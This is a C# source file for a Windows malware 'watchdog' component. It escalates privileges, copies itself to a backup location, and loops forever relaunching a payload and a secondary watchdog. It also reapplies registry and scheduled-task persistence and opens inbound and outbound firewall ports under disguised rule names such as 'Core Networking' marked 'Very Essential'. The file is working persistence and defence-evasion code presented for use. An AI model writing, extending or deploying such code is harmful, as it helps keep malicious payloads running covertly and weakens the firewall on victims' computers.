using WindowsFirewallHelper;
using NetFwTypeLib;
class Watchdog
{
    static void Main(string[] args)
    {

        using (Mutex mutex = new Mutex(false, "Global\\" + Config.PrimaryWatchdogMutexName, out bool isNewInstance))
        {
            watchdogHelper.EnsureHighestPriv(isNewInstance);

            WatchdogLogic();
        }
    }



    static void WatchdogLogic()
    {


        try {
            if (!File.Exists(Path.Combine(Config.SecondaryWatchdogPath, Config.PrimaryWatchdogName)))
            {
                File.Copy(Config.PrimaryWatchdogFullPath, Path.Combine(Config.SecondaryWatchdogPath, Config.PrimaryWatchdogName), overwrite: false);
            }
        }
        catch (Exception e)
        {
            watchdogHelper.Log($"[ERROR] {e.Message}");
        }

        // Example loop to simulate frequent checks
        while (true)
        {
            watchdogHelper.EnsureDirectoryExists(Config.SecondaryWatchdogPath);
            watchdogHelper.EnsureDirectoryExists(Config.PrimaryWatchdogPath);
            watchdogHelper.EnsureDirectoryExists(Config.PayloadPath);


            // Get Firewall Policy
            Type netFwPolicy2Type = Type.GetTypeFromProgID("HNetCfg.FwPolicy2");
            INetFwPolicy2 firewallPolicy = (INetFwPolicy2)Activator.CreateInstance(netFwPolicy2Type);
            foreach (int port in Config.PortsToKeepOpen)
            {
                string inboundName = "Core Networking - Inbound - " + port.ToString();
                CheckAndOpenPort(port, inboundName, firewallPolicy);
                string outboundName = "Core Networking - Outbound - " + port.ToString();
                CheckAndOpenPort(port, outboundName, firewallPolicy, true);
            }

            watchdogHelper.verifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
            watchdogHelper.CheckAndRunPayload(Config.PayloadPath, Config.PayloadName);

            watchdogHelper.verifyFilePathsSourceAndDest(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName);
            watchdogHelper.CheckAndRunWatchdog(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName, Config.SecondaryWatchdogMutexName);

            Persistence.runAllTechniques(); // sets and checks the registry keys and scheduled task

            watchdogHelper.Log("Watchdog is ran its loop");
            Thread.Sleep(Config.sleepTime);  // Sleep
        }
    }

    public static void CheckAndOpenPort(int port, string ruleName, INetFwPolicy2 firewallPolicy, bool isOutbound = false)
    {
        try
        {
            

            // Iterate through firewall rules
            foreach (INetFwRule rule in firewallPolicy.Rules)
            {
                if (rule.Name == ruleName)
                {
                    if (rule.Enabled)
                    {
                        return;  // Rule exists and is enabled, exit function
                    }
                    else
                    {
                        firewallPolicy.Rules.Remove(ruleName);  // Remove disabled rule
                        break;
                    }
                }
            }

            // Create a new rule
            INetFwRule newRule = (INetFwRule)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FwRule"));
            newRule.Name = ruleName;
            newRule.Description = "Very Essential";
            newRule.Protocol = (int)NET_FW_IP_PROTOCOL_.NET_FW_IP_PROTOCOL_TCP;
            newRule.LocalPorts = port.ToString();
            if (isOutbound)
            {
                newRule.Direction = NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_OUT;
            }
            else
            {
                newRule.Direction = NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_IN;
            }
            newRule.Action = NET_FW_ACTION_.NET_FW_ACTION_ALLOW;
            newRule.Enabled = true;

            // Add the rule
            firewallPolicy.Rules.Add(newRule);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }
    }




    
   

